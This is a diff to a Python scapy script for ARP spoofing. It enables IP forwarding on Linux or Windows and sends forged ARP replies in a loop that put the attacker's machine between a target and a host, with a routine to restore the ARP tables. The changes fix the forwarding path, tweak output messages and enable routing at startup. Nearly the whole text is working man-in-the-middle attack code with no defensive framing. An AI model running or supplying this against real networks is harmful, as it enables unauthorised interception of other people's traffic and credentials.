@@ -8,12 +8,12 @@ import scapy.all as sc
 
 
 def _enable_linux_iproute():
-    file_path = '/proc/sys/net/ip4/ip_forward'
+    file_path = "/proc/sys/net/ipv4/ip_forward"
     with open(file_path) as f:
         if f.read() == 1:
+            # already enabled
             return
-
-    with open(file_path, 'w') as f:
+    with open(file_path, "w") as f:
         print(1, file=f)
 
 
@@ -25,7 +25,7 @@ def _enable_windows_iproute():
 
 def enable_ip_route(verbose=True):
     if verbose:
-        print('[!] Enabling IP Routing...', end=' ')
+        print('[!] enabling IP Routing.. ', end='')
 
     _enable_windows_iproute() if 'nt' in os.name else _enable_linux_iproute()
 
@@ -44,6 +44,7 @@ def get_mac(ip):
 
 def spoof(target_ip, host_ip, iface=None, verbose=True):
     target_mac = get_mac(target_ip)
+    # op = {1:'who-has', 2:'is-at'}
     arp_pkt = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op=2)
 
     self_mac = arp_pkt.hwsrc
@@ -60,9 +61,9 @@ def restore(target_ip, host_ip, verbose=True):
     target_mac = get_mac(target_ip)
     host_mac = get_mac(host_ip)
     pkt = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
-    send(pkt, verbose=0, count=10)
+    send(pkt, verbose=0, count=100)
     if verbose:
-        print('[+] sent to {} :  {} @ {}'.format(target_ip, host_ip, host_mac))
+        print('[+] sent to {} : {} is-at {}'.format(target_ip, host_ip, host_mac))
 
 
 if __name__ == '__main__':
@@ -73,6 +74,8 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     verbose = True
+
+    enable_ip_route(verbose)
     try:
         while True:
             spoof(args.target, args.host, iface=args.iface, verbose=verbose)
